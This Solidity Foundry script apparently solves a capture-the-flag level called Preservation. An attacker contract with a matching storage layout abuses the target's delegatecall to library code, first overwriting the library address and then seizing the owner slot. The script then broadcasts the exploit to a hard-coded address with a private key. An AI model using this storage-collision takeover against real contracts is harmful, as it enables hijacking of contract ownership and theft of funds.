// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation code) external {
        code.setFirstTime(uint256(uint160(address(this))));
        code.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}

contract PreservationScript is Script {
    Preservation public code = Preservation(0x94Ac89b23c5514FFAD1fCd7c9f9194172e6c97a2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        Attacker hacker = new Attacker();
        hacker.attack(code);
        vm.stopBroadcast();
    }
}
